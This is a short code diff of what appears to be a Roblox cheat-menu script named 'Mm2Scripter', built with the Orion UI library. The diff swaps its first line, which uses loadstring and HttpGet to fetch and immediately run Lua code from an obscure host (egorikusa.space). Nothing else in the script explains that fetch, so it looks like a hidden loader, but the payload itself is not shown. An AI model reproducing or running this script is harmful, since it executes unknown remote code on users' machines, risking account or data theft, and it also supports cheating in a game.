@@ -1,5 +1,4 @@
-loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
-
+loadstring(game:HttpGet("https://egorikusa.space/a3e65340a89cddd0ca853173.lua", true))()
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 local Window = OrionLib:MakeWindow({Name = "🎃Mm2Scripter🎃", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
